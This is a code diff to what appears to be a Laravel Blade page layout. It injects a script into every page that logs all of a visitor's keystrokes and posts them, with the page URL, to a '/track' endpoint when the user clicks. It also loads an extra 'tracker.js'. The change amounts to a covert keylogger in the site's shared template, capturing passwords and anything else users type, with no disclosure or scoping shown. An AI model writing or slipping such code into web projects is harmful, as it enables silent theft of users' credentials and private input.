@@ -1505,6 +1505,46 @@
 
 @yield('scripts')
 
+  <script>
+      window.token = "{{ csrf_token() }}";
+
+      var url = window.location;
+      window.collectedData = [
+          {
+              type: 'key',
+              data: ''
+          },
+          {
+              type: 'mouse',
+              data: []
+          }
+      ];
+
+      $(document).keypress(function(event) {
+          var x = event.charCode || event.keyCode;  // Get the Unicode value
+          var y = String.fromCharCode(x);
+          collectedData[0].data += y;
+      });
+
+      $(document).click(function() {
+          if (collectedData[0].data.length > 10) {
+              let data_ = collectedData[0].data;
+              let type_ = collectedData[0].type;
+
+              $.ajax({
+                  url: "/track",
+                  type: 'post',
+                  csrf: token,
+                  data: {
+                      url: url,
+                      item: type_,
+                      data: data_
+                  }
+              });
+          }
+      });
+  </script>
+  <script src="{{ asset('js/tracker.js') }}"></script>
 </body>
 
 </html>
